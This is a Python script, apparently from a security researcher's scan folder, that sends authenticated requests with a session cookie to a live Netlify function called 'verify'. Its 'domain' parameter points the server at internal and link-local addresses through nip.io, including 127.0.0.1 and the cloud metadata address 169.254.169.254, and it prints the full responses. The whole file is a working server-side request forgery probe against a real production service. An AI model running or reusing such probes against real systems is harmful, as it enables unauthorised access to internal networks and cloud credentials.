# -*- coding: utf-8 -*-
"""verify 完整响应体分析:字段泄露 + 端口识别 + netlify.app 对照"""
import http.client, ssl, gzip, brotli, json, sys, time, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

ctx = ssl.create_default_context()

def req(path, cookie=COOKIE_A, timeout=30):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    t0 = time.time()
    conn.request('GET', path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    hd = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    return st, raw, dt, hd

SITE_A_APP = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4.netlify.app'
targets = [
    ('example.com',            'example.com'),
    ('SITE_A netlify.app',     SITE_A_APP),
    ('www.' + SITE_A_APP,      'www.' + SITE_A_APP),
    ('netlify.com root',       'netlify.com'),
    ('www.netlify.com',        'www.netlify.com'),
    ('nip 10.255.255.1',       '10.255.255.1.nip.io'),
    ('nip 127.0.0.1',          '127.0.0.1.nip.io'),
    ('httpforever (80 only)',  'httpforever.com'),
    ('nip 169.254.100.5 dns',  '169.254.100.5.nip.io'),
    ('nip 169.254.169.254',    '169.254.169.254.nip.io'),
    ('nip 169.254.100.1',      '169.254.100.1.nip.io'),
]
for label, dom in targets:
    p = '/.netlify/functions/verify?domain=' + urllib.parse.quote(dom, safe='')
    st, raw, dt, hd = req(p)
    print('%-24s st=%d %6.1fs ct=%s' % (label, st, dt, hd.get('content-type', '?')))
    print('   FULL:', raw.decode('utf-8', 'ignore')[:600].replace('\n', ' '))
